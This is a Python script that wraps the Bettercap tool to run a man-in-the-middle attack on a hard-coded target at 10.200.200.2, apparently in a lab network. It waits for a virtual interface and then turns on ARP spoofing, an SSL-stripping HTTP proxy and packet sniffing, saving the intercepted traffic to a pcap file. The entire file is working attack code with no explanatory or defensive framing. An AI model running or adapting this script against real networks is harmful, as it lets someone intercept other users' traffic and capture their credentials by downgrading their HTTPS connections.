#!/usr/bin/env python3
import os
import subprocess
import time

IFACE = "v_eth0"
DEFAULT_LOGFILE = "sslstrip_post.pcap"
TARGET_IP = "10.200.200.2"

def prompt_logfile():
    user_in = input(f"Enter log file name (default: {DEFAULT_LOGFILE}): ").strip()
    return user_in or DEFAULT_LOGFILE

def wait_for_interface(iface, poll_interval=1.0):
    path = f"/sys/class/net/{iface}"
    print(f"[*] Waiting for interface {iface}...")
    while not os.path.isdir(path):
        time.sleep(poll_interval)
    print(f"[*] Interface {iface} detected.")

def launch_bettercap(iface, logfile, target_ip):
    # build the eval string exactly as in your bash script
    eval_cmds = [
        "set http.proxy.port 8080",
        "set http.proxy.sslstrip true",
        f"set net.sniff.output {logfile}",
        f"set arp.spoof.targets {target_ip}",
        "arp.spoof on",
        "http.proxy on",
        "net.sniff on",
    ]
    eval_str = "; ".join(eval_cmds) + ";"

    cmd = [
        "sudo", "bettercap",
        "-iface", iface,
        "-eval", eval_str
    ]
    print("[*] Launching Bettercap...")
    # This will inherit your terminal so you can Ctrl+C to stop
    subprocess.run(cmd, check=True)

def main():
    logfile = prompt_logfile()
    wait_for_interface(IFACE)
    try:
        launch_bettercap(IFACE, logfile, TARGET_IP)
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user. Exiting.")
    except subprocess.CalledProcessError as e:
        print(f"[!] bettercap exited with status {e.returncode}")

if __name__ == "__main__":
    main()
